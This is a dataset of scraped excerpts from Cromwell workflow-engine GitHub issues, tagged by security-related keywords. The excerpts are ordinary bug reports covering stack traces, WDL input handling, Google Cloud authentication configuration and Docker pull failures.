cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:935); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobE,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4274:1128,validat,validatedRuntimeAttributes,1128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4274,1,['validat'],['validatedRuntimeAttributes']
Security,"llowing files are used to show case the issue.; The main workflow:; ```; version 1.0. import ""SubWorkflow.wdl"" as SubWorkflow. workflow MainWorkflow {; input {; String value_2_give = ""default value""; }; call MainTask {; input:; given_value = value_2_give; }. call SubWorkflow.SubWorkflow {; input:; value_2_give = value_2_give; }; }. task MainTask {; input {; String given_value; String? overwrite_given_value; }; command <<<; echo ~{select_first([overwrite_given_value, given_value])};; >>>; }; ```. The subworkflow:; ```; version 1.0. workflow SubWorkflow {; input {; String value_2_give = ""default value""; String? overwrite_value_2_give; }; call SubTask {; input:; given_value = select_first([overwrite_value_2_give, value_2_give]); }; }. task SubTask {; input {; String given_value; String? overwrite_given_value; }; command <<<; echo ~{select_first([overwrite_given_value, given_value])};; >>>; }; ```. To be sure I ran the validation mode of womtools:; ```; $ java -jar womtool-84.jar validate MainWorkflow.wdl; Success!; $ java -jar womtool-84.jar validate SubWorkflow.wdl; Success!; ```. After creating these files, I ran womtool with the ""inputs"" option getting the following output:; ```; $ java -jar womtool-84.jar inputs MainWorkflow.wdl; {; ""MainWorkflow.SubWorkflow.overwrite_value_2_give"": ""String? (optional)"",; ""MainWorkflow.MainTask.overwrite_given_value"": ""String? (optional)"",; ""MainWorkflow.value_2_give"": ""String (optional, default = \""default value\"")""; }; ```; This output json shows which variables you can (or must) provide in order to be able to run in this case the main workflow. here we see that we are able to provide values for the Mainworkflow, MainTask and SubWorkflow but not the SubTask.; If we do the same for just the subworkflow:; ```; $ java -jar womtool-84.jar inputs SubWorkflow.wdl; {; ""SubWorkflow.overwrite_value_2_give"": ""String? (optional)"",; ""SubWorkflow.SubTask.overwrite_given_value"": ""String? (optional)"",; ""SubWorkflow.value_2_give"": ""String (optio",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6841:1367,validat,validate,1367,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6841,1,['validat'],['validate']
Security,"lo:NA:1]: Error attempting to Execute; cromwell.engine.io.IoAttempts$EnhancedCromwellIoException: [Attempted 1 time(s)] - StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; Caused by: com.google.cloud.storage.StorageException: xxx@xxx.iam.gserviceaccount.com does not have serviceusage.services.use access to the Google Cloud project.; ```; I had set up my credentials with:; ```; export GOOGLE_APPLICATION_CREDENTIALS=sa.json; ```; and had this configuration in `google.conf` copied from the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/):; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }; ```; That clearly did not work. I tried to follow the logic in this post. I followed Horneth suggestion to use `service-account`'s authorization and I took the [auths](https://cromwell.readthedocs.io/en/develop/backends/Google/) configuration and changed `pem-file` to `json-file` in `google.conf` as follows:; ```; google {; application-name = ""cromwell""; auths = [; {; name = ""service_account""; scheme = ""service_account""; service-account-id = ""xxx@xxx.iam.gserviceaccount.com""; json-file = ""sa.json""; }; ]; }. engine {; filesystems {; gcs {; auth = ""service_account""; project = ""xxx""; }; }; }; ```; And I have replaced every other instance of `auth = ""application-default""` with `auth = ""service_account""`. Now when I run Cromwell:; ```; java -Dconfig.file=google.conf -jar cromwell-52.jar run hello.wdl -i hello.inputs; ```; I don't get the error anymore. I do get a different error:; ```; [2020-07-27 22:54:56,48] [info] WorkflowManagerActor Workflow 0fb5e69d-7d70-407e-9fe2-bf7cb2b2c3e6 failed (during ExecutingWorkflowState): java.lang.Exception: Task wf_hello.hello:NA:1 failed. The job was stopped before the command fin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906:1156,authoriz,authorization,1156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690#issuecomment-664753906,2,['authoriz'],['authorization']
Security,"local/DockerCliClient.scala#L26; https://github.com/broadinstitute/cromwell/blob/1898d8103a06d160dc721d464862313e78ee7a2c/dockerHashing/src/main/scala/cromwell/docker/local/DockerCliClient.scala#L78-L92. Can we instead use the image ID instead of the digest when using local images?. <details>. <summary>log output</summary>. ```; [INFO] [09/16/2019 11:07:14.821] [cromwell-system-akka.dispatchers.engine-dispatcher-40] [akka://cromwell-system/user/SingleWorkflowRunnerActor/JobExecutionTokenDispenser] Not triggering log of token queue status. Effective log interval = None; [INFO] [09/16/2019 11:07:14.830] [cromwell-system-akka.dispatchers.engine-dispatcher-76] [akka://cromwell-system/user/SingleWorkflowRunnerActor/JobExecutionTokenDispenser] Assigned new job execution tokens to the following groups: 2b766fe6: 1; [2019-09-16 11:07:16,20] [error] Docker pull failed; java.lang.RuntimeException: Error running: docker pull <image>; Exit code: 1; Error response from daemon: pull access denied for <image> repository does not exist or may require 'docker login': denied: requested access to the resource is denied. 	at cromwell.docker.local.DockerCliClient.$anonfun$forRun$1(DockerCliClient.scala:58); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.docker.local.DockerCliClient.forRun(DockerCliClient.scala:50); 	at cromwell.docker.local.DockerCliClient.pull(DockerCliClient.scala:37); 	at cromwell.docker.local.DockerCliClient.pull$(DockerCliClient.scala:36); 	at cromwell.docker.local.DockerCliClient$.pull(DockerCliClient.scala:94); 	at cromwell.docker.local.DockerCliFlow$.pull(DockerCliFlow.scala:101); 	at cromwell.docker.local.DockerCliFlow.$anonfun$run$1(DockerCliFlow.scala:35); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:139); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:351); 	at cats.effect.internals.IORunLoop$RestartCallback.run(IORunLoop.scala:362); 	at cats.effect.internals.Trampoline.cats$eff",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178:1454,access,access,1454,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178,2,['access'],['access']
Security,localizing-files; 2017/02/07 15:41:48 I: Calling SetOperationStatus(localizing-files); 2017/02/07 15:41:48 I: SetOperationStatus(localizing-files) succeeded; 2017/02/07 15:41:48 I: Docker file /cromwell_root/exec.sh maps to host; location /mnt/local-disk/exec.sh.; 2017/02/07 15:41:48 I: Copying; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; to /mnt/local-disk/exec.sh; 2017/02/07 15:41:48 I: Running command: sudo gsutil -q -m cp; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:1442,access,access,1442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,log from my run includes potentially useful information on the step. `[ERROR] [05/17/2018 15:47:23.959] [cromwell-system-akka.dispatchers.engine-dispatcher-48] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-67f5112e-5c3d-4a03-9c78-97725bf0d9cf/WorkflowExecutionActor-67f5112e-5c3d-4a03-9c78-97725bf0d9cf/67f5112e-5c3d-4a03-9c78-97725bf0d9cf-EngineJobExecutionActor-batch_for_variantcall:NA:1/ejha_for_67f5112e-5c3d-4a03-9c78-97725bf0d9cf:BackendJobDescriptorKey_CommandCallNode_batch_for_variantcall:-1:1/CCHashingJobActor-67f5112e-batch_for_variantcall:NA:1] Failed to hash null`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-389918760:613,hash,hash,613,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-389918760,1,['hash'],['hash']
Security,logs show integrity constraint violation in hsqldb when running job is aborted,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/869:10,integrity,integrity,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/869,1,['integrity'],['integrity']
Security,"logue = ""sync"". #. # To turn off the default `sync` behavior set this value to an empty string:. # script-epilogue = """". . # The list of possible runtime custom attributes. runtime-attributes = """""". String? docker. String? docker_name. """""". . # Submit string when there is no ""docker"" runtime attribute. submit = ""/bin/bash ${script}"". . # Submit string when there is a ""docker"" runtime attribute. submit-docker = """""". chmod u+x ${cwd}/execution/script && \. docker run --rm \. -v ${cwd}:${docker_cwd} \. ${docker_name} /bin/bash -c ${script}. """""". . # Root directory where Cromwell writes job results. This directory must be. # visible and writeable by the Cromwell process as well as the jobs that Cromwell. # launches. root = ""cromwell-executions"". . # File system configuration. filesystems {. . # For SFS backends, the ""local"" configuration specifies how files are handled. local {. . # Try to hard link (ln), then soft-link (ln -s), and if both fail, then copy the files. localization: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Call caching strategies. caching {. # When copying a cached result, what type of file duplication should occur. Attempted in the order listed below:. duplication-strategy: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Possible values: file, path. # ""file"" will compute an md5 hash of the file content. # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",. # in order to allow for the original file path to be hashed. hashing-strategy: ""file"". . # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. # If false or the md5 does not exist, will proceed with the above-defined hashing strategy. check-sibling-md5: false. }. }. }. . # The defaults for runtime attributes if not provided. default-runtime-attributes {. failOnStderr: false. continueOnReturnCode: 0. }. }. }. }. }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595:3167,hash,hash,3167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595,6,['hash'],"['hash', 'hashed', 'hashing', 'hashing-strategy']"
Security,looks like we give a free pass on external contributors for at least some backends during CI:; ```; ********************************************************; ********************************************************; ** **; ** WARNING: Encrypted keys are unavailable. Exiting. **; ** **; ********************************************************; ********************************************************; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4833#issuecomment-483297075:235,Encrypt,Encrypted,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4833#issuecomment-483297075,1,['Encrypt'],['Encrypted']
Security,loop$1(Eval.scala:354); cats.Eval$.cats$Eval$$evaluate(Eval.scala:372); cats.Eval$Defer.value(Eval.scala:258); cats.instances.VectorInstances$$anon$1.traverse(vector.scala:76); cats.instances.VectorInstances$$anon$1.traverse(vector.scala:12); cats.Traverse$Ops.traverse(Traverse.scala:19); cats.Traverse$Ops.traverse$(Traverse.scala:19); cats.Traverse$ToTraverseOps$$anon$3.traverse(Traverse.scala:19); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$5(FileElementToWomBundle.scala:51); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWorkflowInner$1(FileElementToWomBundle.scala:48); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$14(FileElementToWomBundle.scala:77); scala.Function2.$anonfun$tupled$1(Function2.scala:48); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); common.validation.ErrorOr$ShortCircuitingFlatMapTuple2$.flatMapN$extension(ErrorOr.scala:49); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$12(FileElementToWomBundle.scala:77); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:75); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.toWomBundle(FileElementToWomBundle.scala:30); wom.transforms.WomBundleMaker$Ops.toWomBundle(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$Ops.toWomBundle$(WomExecutableMaker.scala:16); wom.transforms.WomBundleMaker$ops$$anon$2.toWomBundle(WomExecutableMaker.scala:16); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$.convert(FileElementToWomBundle.scala:82); wdl.draft3.transforms.wdlom2wom.package$.$anonfun$fileElementToWomBundle$1(package.scala:13); scala.util.Either$RightProjection.flatMap(Either.scala:702); cat,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:7162,validat,validation,7162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,"lotypeCaller ^[[31m(BETA Tool) ^[[36mCall germline SNPs and indels via local re-assembly of haplotypes^[[0m; ^[[32m IndexFeatureFile ^[[36mCreates indices for Feature-containing files (eg VCF and BED files)^[[0m; ^[[32m LiftOverVcf ^[[36mLifts a VCF between genome builds^[[0m; ^[[32m MakeSitesOnlyVcf ^[[36mCreates a VCF bereft of genotype information from an input VCF^[[0m; ^[[32m MergeVcfs ^[[36mMerges multiple VCF files into one VCF file^[[0m; ^[[32m Mutect2 ^[[31m(BETA Tool) ^[[36mCall somatic SNVs and indels via local assembly of haplotypes^[[0m; ^[[32m RemoveNearbyIndels ^[[36m(Internal) Remove indels that are close to each other from a vcf^[[0m; ^[[32m RenameSampleInVcf ^[[36mRename a sample within a VCF^[[0m; ^[[32m SelectVariants ^[[36mSelect a subset of variants from a VCF file^[[0m; ^[[32m SortVcf ^[[36mSorts one or more VCF files^[[0m; ^[[32m SplitIntervals ^[[36mSplit intervals into sub-interval files.^[[0m; ^[[32m SplitVcfs ^[[36mSplits an input VCF file into two VCF files^[[0m; ^[[32m UpdateVCFSequenceDictionary ^[[36mUpdates the sequence dictionary in a variant file.^[[0m; ^[[32m ValidateVariants ^[[36mValidate VCF^[[0m; ^[[32m VariantFiltration ^[[36mFilter variant calls based on INFO and FORMAT annotations^[[0m; ^[[32m VariantRecalibrator ^[[36mBuild a recalibration model to score variant quality for filtering purposes^[[0m; ^[[32m VariantsToTable ^[[36mExtract specific fields from a VCF file to a tab-delimited table^[[0m; ^[[32m VcfToIntervalList ^[[36mConverts a VCF file to a Picard Interval List^[[0m. ^[[37m--------------------------------------------------------------------------------------; ^[[0m; Exception in thread ""main"" org.broadinstitute.hellbender.exceptions.UserException: '-T' is not a valid command. at org.broadinstitute.hellbender.Main.extractCommandLineProgram(Main.java:291); at org.broadinstitute.hellbender.Main.mainEntry(Main.java:150); at org.broadinstitute.hellbender.Main.main(Main.java:233); ```. Any advise?. Thank you very much",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2673:12190,Validat,ValidateVariants,12190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2673,1,['Validat'],['ValidateVariants']
Security,"low.scala:52),List())WorkflowFailure(wdl.WdlWorkflow.womDefinition$lzycompute(WdlWorkflow.scala:73),List())WorkflowFailure(wdl.WdlWorkflow.womDefinition(WdlWorkflow.scala:73),List())WorkflowFailure(wdl.WdlInputParsing$.buildWomExecutable(WdlInputParsing.scala:27),List())WorkflowFailure(wdl.WdlNamespaceWithWorkflow.womExecutable(WdlNamespace.scala:97),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$15(MaterializeWorkflowDescriptorActor.scala:493),List())WorkflowFailure(scala.util.Either.flatMap(Either.scala:338),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$13(MaterializeWorkflowDescriptorActor.scala:491),List())WorkflowFailure(scala.util.Either.flatMap(Either.scala:338),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.validateWdlNamespace(MaterializeWorkflowDescriptorActor.scala:490),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:231),List())WorkflowFailure(cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:157),List())WorkflowFailure(scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:304),List())WorkflowFailure(scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37),List())WorkflowFailure(scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60),List())WorkflowFailure(akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55),List())WorkflowFailure(akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91),List())WorkflowFailure(",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3176:1838,validat,validateWdlNamespace,1838,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3176,1,['validat'],['validateWdlNamespace']
Security,"lready answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; The [cromwell.examples.conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf) file seems to mix multiple styles in terms of delimiters. Some entries are colon delimited as if they were from JSON, e.g.:. ```; workflow-options {; # These workflow options will be encrypted when stored in the database; #encrypted-fields: []. # AES-256 key to use to encrypt the values in `encrypted-fields`; #base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="". # Directory where to write per workflow logs; #workflow-log-dir: ""cromwell-workflow-logs"". # When true, per workflow logs will be deleted after copying; #workflow-log-temporary: true. # Workflow-failure-mode determines what happens to other calls when a call fails. Can be either ContinueWhilePossible or NoNewCalls.; # Can also be overridden in workflow options. Defaults to NoNewCalls. Uncomment to change:; #workflow-failure-mode: ""ContinueWhilePossible"". default {; # When a workflow type is not provided on workflow submission, this specifies the default type.; #workflow-type: WDL. # When a workflow type version is not provided on workflow submission, this specifies the default type version.; #workflow-type-version: ""draft-2"". # To set a default hog group rather than defaulting to workflow I",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4913:1125,encrypt,encrypted,1125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4913,2,['encrypt'],"['encrypted', 'encrypted-fields']"
Security,"luate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""reason\"" : \""badRequest\""\n } ],\n \""message\"" : \""Pipeline 9453747469251135900: Unable to evaluate parameters: %!(EXTRA string=parameter \\\""input_array-0\\\"" has invalid value: bar, baz)\"",\n \""status\"" : \""INVALID_ARGUMENT\""\n}""; }],; ""backend"": ""JES"",; ""end"": ""2016-08-01T19:58:05.000000Z"",; ""stderr"": ""gs://fc-5539c024-3ba8-4ed1-97c3-82fed2675776/1626e6be-60ed-48b1-9bbc-a3fdef4a90f5/aggregate_data_workflow/7be16669-0f81-4e19-96a0-dbe4b72cee8e/call-aggregate_data/aggregate_data-stderr.log"",; ""attempt"": 1,; ""executionEvents"": [],; ""backendLogs"": {; ""log"": ""gs://fc-5539c024-3ba8-4ed1-97c3-82fed2675776/1626e6be-60ed-48b1-9bbc-a3fdef4a90f5/aggregate_data_workflow/7be16669-0f81-4e19-96a0-dbe4b72cee8e/call-aggregate_data/aggregate_data.log""; },; ""start"": ""2016-08-01T19:56:48.000000Z""; }]; },; ""outputs"": {. },; ""id"": ""7be16669-0f81-4e19-96a0-dbe4b72cee8e"",; ""submission"": ""2016-08-01T19:56:48.000000Z"",; ""status"": ""Failed"",; ""end"": ""2016-08-01T19:58:05.000000Z"",; ""start"": ""2016-08-01T19:56:48.000000Z""; }; ```. Here the failures section has a nested structure.; ```; {; ""workflowName"": ""echo_strings"",; ""submittedFiles"": {; ""inputs"": ""...""; },; ""calls"": {. },; ""outputs"": {. },; ""id"": ""12677a12-bca2-41a6-b583-596262c7e0c7"",; ""inputs"": {...; },; ""submission"": ""2017-01-31T17:54:48.812Z"",; ""status"": ""Failed"",; ""failures"": [{; ""causedBy"": {; ""causedBy"": {; ""message"": ""connect timed out""; },; ""message"": ""Error getting access token for service account: ""; },; ""message"": ""Failed to upload authentication file""; }],; ""workflowLog"": ""gs://fc-2d3fd356-e3be-4953-92f1-60af623e6fa5/4503a3b1-5b50-4474-8a31-809e73510622/workflow.logs/workflow.12677a12-bca2-41a6-b583-596262c7e0c7.log"",; ""end"": ""2017-01-31T17:55:10.439Z"",; ""start"": ""2017-01-31T17:54:50.257Z""; }; ```. This inconsistency in the format of the failure messages makes it difficult to show properly formated failure messages in our UI.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2037:8873,access,access,8873,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2037,2,"['access', 'authenticat']","['access', 'authentication']"
Security,lue.scala:62) ~[cromwell.jar:0.19];   at wdl4s.values.WdlValue$$anonfun$computeHash$3.apply(WdlValue.scala:62) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream$$anonfun$map$1.apply(Stream.scala:418) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream$$anonfun$map$1.apply(Stream.scala:418) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream$Cons.tail(Stream.scala:1233) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream$Cons.tail(Stream.scala:1223) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream.force(Stream.scala:272) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream.mkString(Stream.scala:820) ~[cromwell.jar:0.19];   at scala.collection.immutable.Stream.mkString(Stream.scala:817) ~[cromwell.jar:0.19];   at wdl4s.values.WdlValue$class.computeHash(WdlValue.scala:62) ~[cromwell.jar:0.19];   at wdl4s.values.WdlArray.computeHash(WdlArray.scala:17) ~[cromwell.jar:0.19];   at cromwell.engine.backend.WorkflowDescriptor.hash(WorkflowDescriptor.scala:229) ~[cromwell.jar:0.19];   at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:627) ~[cromwell.jar:0.19];   at cromwell.engine.backend.jes.JesBackend$$anonfun$postProcess$1$$anonfun$apply$14.apply(JesBackend.scala:626) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.MapLike$MappedValues$$anonfun$foreach$3.apply(MapLike.scala:245) ~[cromwell.jar:0.19];   at scala.collection.TraversableLike$WithFilter$$anonfun$foreach$1.apply(TraversableLike.scala:778) ~[cromwell.jar:0.19];   a,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/826:4865,hash,hash,4865,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/826,1,['hash'],['hash']
Security,lyQualifiedInputs$1.apply(WorkflowActor.scala:982) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$fetchLocallyQualifiedInputs$1.apply(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.fetchLocallyQualifiedInputs(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$processRunnableCall(WorkflowActor.scala:1254) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:868) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467) ~[cromwell.jar:0.19]; at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36) ~[cromwel,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:5673,Hash,HashMap,5673,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['Hash'],['HashMap']
Security,"m-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.create is not supported for this resource.; ```; and there is clearly an extra role missing as roles `storage.objectCreator`, `storage.objectViewer`, `genomics.pipelinesRunner`, `genomics.admin`, `iam.serviceAccountUser` (corresponding to roles Storage Object Creator, Storage Object Viewer, Genomics Pipelines Runner, Genomics Admin, Service Account User) are not sufficient to create files inside Google buckets. 3) The [permissions](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#permissions) section guides the user into creating a new service account under the current project. This would need to be selected in the configuration file with an authorization with `scheme = ""service_account""` but instead both the configuration file for [PAPIv2](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#setting-up-papiv2) and the configuration file for [PAPIv1](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#lets-get-started) are configured to use an authorization with `scheme = ""application_default""`. I find it very hard to believe that any novel user could go through the tutorial and successfully set up a Cromwell server. On a slightly different note, some of my issues would be resolved if I could run jobs using my user account rather than a service account associated 